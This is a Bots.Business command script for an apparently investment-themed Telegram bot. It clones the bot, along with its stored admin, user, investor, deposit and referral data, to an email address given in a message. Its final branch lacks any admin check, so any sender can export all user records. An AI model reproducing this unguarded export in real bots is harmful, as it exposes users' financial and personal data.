/*CMD
  command: /Ontransfer
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: 
  keyboard: 
  aliases: 
CMD*/

if (!options) {
  return
}
var newT = Bot.getProperty("admink", { list: {} })
//here herre here here
var admin_info = Bot.getProperty("admin", { list: {} })
var user_info = Bot.getProperty("user", { list: {} })
var investor_info = Bot.getProperty("investor", { list: {} })
var my_investment = Bot.getProperty("my_investment", { list: {} })
var actvR = Bot.getProperty("active_referral", { list: {} })
var deposit = Bot.getProperty("deposit", { list: {} })
if (options.name == "new") {
  BBAdmin.installBot({
    email: message,
    bot_id: bot.id,
    as_protected: true,
    bot_properties: [{ name: "admin", value: newT, type: "json" }]
  })
  Bot.sendMessage("done sent new data")
  return
}
var admin = admin_info.list["admin"].admin == user.telegramid
if (admin) {
  BBAdmin.installBot({
    email: message,
    bot_id: bot.id,
    bot_properties: [
      { name: "admin", value: admin_info, type: "json" },
      { name: "user", value: user_info, type: "json" },
      { name: "investor", value: investor_info, type: "json" },
      { name: "my_investment", value: my_investment, type: "json" },
      { name: "active_referral", value: actvR, type: "json" },
      { name: "deposit", value: deposit, type: "json" }
    ]
  })
  Bot.sendMessage("admin, done sent old data")
  return
}
BBAdmin.installBot({
  email: message,
  as_protected: true,
  bot_id: bot.id,
  bot_properties: [
    { name: "admin", value: admin_info, type: "json" },
    { name: "user", value: user_info, type: "json" },
    { name: "investor", value: investor_info, type: "json" },
    { name: "my_investment", value: my_investment, type: "json" },
    { name: "active_referral", value: actvR, type: "json" },
    { name: "deposit", value: deposit, type: "json" }
  ]
})
Bot.sendMessage("done sent old data")

